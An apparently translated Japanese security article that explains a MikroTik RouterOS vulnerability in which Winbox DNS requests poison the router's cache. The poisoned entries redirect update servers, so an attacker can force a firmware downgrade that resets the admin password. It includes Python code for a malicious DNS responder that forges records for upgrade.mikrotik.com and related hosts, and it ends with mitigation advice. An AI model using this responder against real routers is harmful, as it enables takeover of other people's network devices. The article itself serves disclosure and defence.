RouterOSのバックポートの脆弱性により、数十万のデバイスが侵害されます



RouterOS（Mikrotik）ベースのデバイスをリモートでダウングレードする機能は、数十万のネットワークデバイスを脅かします。この脆弱性は、WinboxプロトコルのDNSキャッシュの汚染に関連しており、古い（デフォルトではパスワードをリセットする）または変更されたファームウェアをデバイスにダウンロードすることができます。



脆弱性の詳細


RouterOSターミナルは、DNSルックアップの解決コマンドをサポートしています。



この要求は、リゾルバーという名前のバイナリーによって処理されます。リゾルバは、RouterOS Winboxプロトコルに接続されている多くのバイナリの1つです。高レベルでは、Winboxポートに送信された「メッセージ」は、アレイベースの番号付けスキームに基づいて、RouterOSのさまざまなバイナリにルーティングできます。

デフォルトでは、RouterOSのDNSサーバー機能は無効になっています。



ただし、サーバー機能を無効にしても、ルーターは独自のDNSキャッシュを維持します。



winbox_dns_request（example.comなど）を使用してリクエストを行うと、ルーターは結果をキャッシュします。



リクエストが経由するDNSサーバーを指定できるため、間違ったアドレスを入力することは簡単です。たとえば、IPアドレス192.168.88.250を含むAレコードで常に応答するように、Philip Klausの DNSサーバーの実装を構成できます。

def dns_response(data):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(
        id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    qname = request.q.qname
    qn = str(qname)
    reply.add_answer(RR(qn,ttl=30,rdata=A("192.168.88.250")))
    print("---- Reply:\n", reply)
    return reply.pack()

Winboxを使用してexample.comを検索すると、ルーターのDNSキャッシュが汚染されていることがわかります。



もちろん、ルータが実際に使用しないため、example.comのポイズニングはあまり役に立ちません。ただし、ルーターはupgrade.mikrotik.com、cloud.mikrotik.com、cloud2.mikrotik.com、download.mikrotik.comにアクセスする必要があります。そして別の間違いのおかげで、それらを一度にすべて毒することが可能です。

def dns_response(data):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(
        id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    qname = request.q.qname
    qn = str(qname)
    reply.add_answer(RR(qn,ttl=30,rdata=A("192.168.88.250")))
    reply.add_answer(RR("upgrade.mikrotik.com",ttl=604800,
        rdata=A("192.168.88.250")))
    reply.add_answer(RR("cloud.mikrotik.com",ttl=604800,
        rdata=A("192.168.88.250")))
    reply.add_answer(RR("cloud2.mikrotik.com",ttl=604800,
        rdata=A("192.168.88.250")))
    reply.add_answer(RR("download.mikrotik.com",ttl=604800,
        rdata=A("192.168.88.250")))
    print("---- Reply:\n", reply)
    return reply.pack()

ルーターは1つの許可を要求し、5つのバックを提供します。ルーターはこれらすべての応答を誤ってキャッシュします。



この攻撃は、ルーターのクライアントを攻撃できるため、ルーターがDNSサーバーとして機能している場合にも明らかに役立ちます。

この攻撃では、RouterOSバージョンのダウングレードまたはバックポートというより深刻な脆弱性を悪用することもできます。攻撃者は、変更ログを含む更新サーバーのロジックを再作成し、RouterOSに古い（脆弱な）バージョンを最新のものとして受け入れさせます。ここでの危険は、バージョンを「更新」すると、管理者パスワードがデフォルト値にリセットされるという事実にあります-攻撃者は空のパスワードでシステムにログインできます！


作者がファームウェアにバックドアを埋め込むことに関連するものを含むいくつかのベクトルを実装 しているという事実にもかかわらず、攻撃は非常にうまくいきますが、これはすでに冗長な手法であり、不正な目的で使用することは違法です。

保護


Winboxを無効にするだけで、これらの攻撃から保護されます。Winboxによる管理の便利さにもかかわらず、SSHプロトコルを使用することをお勧めします。
